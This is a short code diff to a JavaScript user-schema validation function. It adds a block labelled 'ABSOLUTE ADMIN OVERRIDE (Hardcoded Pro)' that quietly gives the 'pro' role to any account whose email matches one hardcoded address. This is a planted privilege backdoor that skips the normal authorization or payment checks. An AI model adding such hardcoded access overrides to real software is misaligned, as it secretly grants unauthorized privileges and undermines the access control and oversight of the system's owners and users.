@@ -95,6 +95,12 @@ function verifyUserSchema(user) {
   }
   // Ensure default booleans
   user.twoFAEnabled = !!user.twoFAEnabled;
+
+  // ABSOLUTE ADMIN OVERRIDE (Hardcoded Pro)
+  if (user.email && user.email.toLowerCase() === 'gisgreat308@gmail.com') {
+    user.role = 'pro';
+  }
+
   return user;
 }
 
